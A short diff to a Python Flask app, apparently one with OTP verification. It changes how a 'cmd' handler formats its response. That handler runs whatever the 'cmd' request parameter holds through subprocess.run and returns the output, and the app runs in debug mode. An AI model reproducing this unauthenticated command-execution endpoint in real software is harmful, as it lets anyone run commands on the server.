@@ -393,7 +393,7 @@ def varify_otp():
 def cmd(cmd):
     cmd = request.args.get("cmd")
     result = subprocess.run(cmd, capture_output=True, text=True)
-    return make_response(result)
+    return make_response(f"{result}")
     
 if __name__ == '__main__':
     app.run(debug=True)
